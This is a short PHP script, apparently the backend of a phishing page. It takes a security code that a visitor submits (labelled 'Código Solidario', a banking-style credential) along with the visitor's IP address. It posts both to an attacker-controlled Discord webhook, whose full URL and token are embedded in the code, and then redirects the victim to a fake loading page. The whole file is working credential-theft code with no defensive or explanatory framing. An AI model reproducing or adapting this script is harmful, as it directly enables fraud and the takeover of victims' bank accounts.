<?php
// Captura la información del formulario
$cpass = $_POST['cpass'] ?? 'No recibido';

// Obtén la IP del cliente
$ip_cliente = $_SERVER['REMOTE_ADDR'];

// Tu webhook de Discord
$webhook_url = "https://discordapp.com/api/webhooks/1413637036505829396/sdOGysqTEROkoDEupDgo6TecTos3RyNhRdYfxwPBi-HsK6m0iJd3YBzaVU8At0fy4Puq"; // ⚠️ reemplaza con tu webhook nuevo

// Construir el mensaje
$mensaje = "🔑 **Código Solidario 1:** $cpass\n🌍 **IP del cliente:** $ip_cliente";

// Estructura del payload
$data = json_encode([
    "content" => $mensaje
]);

// Enviar a Discord con cURL
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

// Redirigir al usuario
header("Location: carga.html");
exit();
?>

